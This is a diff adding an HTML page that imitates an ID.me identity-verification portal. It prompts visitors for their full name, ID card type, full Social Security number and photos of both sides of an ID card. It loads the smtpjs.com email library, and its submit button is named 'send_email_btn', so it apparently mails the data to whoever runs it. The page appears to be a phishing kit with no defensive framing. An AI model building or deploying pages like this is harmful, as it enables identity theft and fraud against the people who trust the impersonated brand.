@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="favicon" href="./assets/favicon.png" >
+  <link rel="stylesheet" href="./css/index.css" >
+  <link rel="stylesheet" href="./css/extra.css" >
+  <link rel="stylesheet" href="./css/main.css" >
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+  <title>ID.me - Verification</title>
+
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+</head>
+<body>
+  <div id="loader">
+    <span class="loader"></span>
+    <p class="text">Loading ...</p>
+  </div>
+  <div id="verified" class="verified">
+    <i class="ri-checkbox-circle-line icon"></i>
+    <p class="text">Verification Successful</p>
+  </div>
+  <header>
+    <img src="./assets/logo.png" alt="LOGO" class="logo_img">
+    <button id="verify-id-nav" class="verify_id_btn toggle_verify_btn">
+      <span class="text">Verify ID</span>
+      <i class="ri-arrow-right-line icon"></i>
+    </button>
+  </header>
+
+  <section id="hero" class="hero">
+    <img src="./assets/background.jpg" alt="background" class="bg_img">
+    <div class="welcome_container">
+      <h2 class="heading">Welcome</h2>
+      <small class="text">to</small>
+      <img src="./assets/logo.png" alt="LOGO" class="logo_img">
+    </div>
+    <div class="info_container">
+      <p class="info">Verify your account in partnership with ID.me</p>
+    </div>
+    <div class="image_container">
+      <img src="./assets/" alt="">
+    </div>
+
+    <div class="button_container">
+      <button class="verify_btn toggle_verify_btn btn">Verify ID Now</button>
+      <button class="guide_btn toggle_guide_btn btn">Quick Guide</button>
+    </div>
+  </section>
+
+  <!-- <div class="open_background"></div> -->
+  <section id="guide" class="guide_section">
+    <div class="guide_content">
+      <div class="head">
+        <button class="back_btn">
+          <i class="ri-arrow-left-s-line icon"></i>
+        </button>
+        <p class="text">Quick Guide</p>
+      </div>
+      
+      <div class="content">
+        <div class="guide _1">
+          <p class="number">1</p>
+          <p class="info">Click on the “Verify” button to open our user-friendly form page.</p>
+        </div>
+        <div class="guide _2">
+          <p class="number">2</p>
+          <p class="info">Fill the details section as it is in your card and cross-check.</p>
+        </div>
+        <div class="guide _3">
+          <p class="number">3</p>
+          <p class="info">Capture a clear image. Ensure all details are visible.</p>
+        </div>
+        <div class="guide _4">
+          <p class="number">4</p>
+          <p class="info">Choose your verification method to verify.</p>
+        </div>
+        <button class="verify_btn toggle_verify_btn">Verify Now</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="verify" class="verify_section">
+    <form action="#" class="verify_form">
+      <div class="head">
+        <button id="verify_back_btn" class="back_btn">
+          <i class="ri-arrow-left-s-line icon"></i>
+        </button>
+        <p class="text">Details validation</p>
+      </div>
+      <div class="details">
+        <div class="input_container">
+          <label for="full_name" class="label">Fullname:</label>
+          <input type="text" class="input" id="full_name" placeholder="John Doe" required />
+          <i class="ri-information-fill icon"></i>
+          <div class="triangle"></div>
+          <small class="info">Enter your full name.<p>Format: "Surname" - "Firstname"</p></small>
+        </div>
+        
+        <div class="input_container">
+          <label for="card_type" class="label">Card type:</label>
+          <input type="text" class="input" id="card_type" placeholder="Driver's license" required />
+          <i class="ri-information-fill icon"></i>
+          <div class="triangle"></div>
+          <small class="info">Enter your card type.<p>Make sure it's same as it is on the card</p></small>
+        </div>
+        
+        <div class="input_container">
+          <label for="ssn" class="label">SSN:</label>
+          <input type="password" class="input" id="ssn" placeholder="******45345" required />
+          <i class="ri-information-fill icon"></i>
+          <div class="triangle"></div>
+          <small class="info">Enter your full SSN.<p>Do not show it to others while typing it</p></small>
+        </div>
+      </div>
+      
+      <div class="head">
+        <!-- <button class="back_btn">
+          <i class="ri-arrow-left-s-line icon"></i>
+        </button> -->
+        <p class="text">Image validation</p>
+      </div>
+      
+      <div class="images">
+        <div class="input_container">
+          <label for="front_card_image" class="label">
+            <span>Front Card Image:</span>
+            <i class="ri-image-add-fill icon front_image_icon"></i>
+            <i class="ri-checkbox-circle-line icon front_check_icon" style="display: none"></i>
+          </label>
+          <input type="file" accept="image/*" class="input" id="front_card_image" placeholder="******45345" required />
+          <i class="ri-information-fill icon"></i>
+          <div class="triangle"></div>
+          <small class="info">Upload your front card image.<p>Make sure it is clear enough for scanning</p></small>
+          <!-- <div class="success-checkmark">
+            <div class="check-icon">
+              <span class="icon-line line-tip"></span>
+              <span class="icon-line line-long"></span>
+              <div class="icon-circle"></div>
+              <div class="icon-fix"></div>
+            </div>
+          </div> -->
+        </div>        
+        <div class="input_container">
+          <label for="back_card_image" class="label">
+            <span>Back Card Image:</span>
+            <i class="ri-image-add-fill icon back_image_icon"></i>
+            <i class="ri-checkbox-circle-line icon back_check_icon" style="display: none"></i>
+          </label>
+          <input type="file" accept="image/*" class="input" id="back_card_image" placeholder="******45345" required />
+          <i class="ri-information-fill icon"></i>
+          <div class="triangle"></div>
+          <small class="info">Upload your back card image.<p>Make sure it is clear enough for scanning</p></small>
+        </div>
+
+        <button id="send_email_btn" class="verify_btn toggle_verify_btn">Verify Now</button>
+      </div>
+    </form>
+  </section>
+
+  <footer class="footer">
+    <p class="copyright">Copyright &copy; 2023 id.me corporations. All rights reserved</p>
+  </footer>
+</body>
+<script src="./js/index.js"></script>
+</html>
